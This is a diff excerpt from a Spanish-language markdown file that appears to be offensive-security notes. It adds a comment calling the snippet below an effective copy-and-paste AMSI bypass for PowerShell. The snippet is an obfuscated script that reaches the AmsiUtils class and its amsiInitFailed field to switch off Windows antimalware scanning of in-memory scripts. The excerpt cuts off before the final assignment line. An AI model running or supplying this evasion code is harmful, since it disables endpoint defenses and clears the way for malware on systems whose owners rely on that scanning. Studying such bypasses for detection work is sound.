@@ -57,6 +57,8 @@ Los siguientes scripts los podemos ejecutar en la consola de  **Powershell**  an
 ## Otra alternativa para el ByPass:
 
 ```Powershell 
+# Copiar y pegar en powershell para evadir el AMSI (Efectiva). Esto solo funciona al cargar en memoria los binarios ".PS1"
+
 $a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
 $assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
 $field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
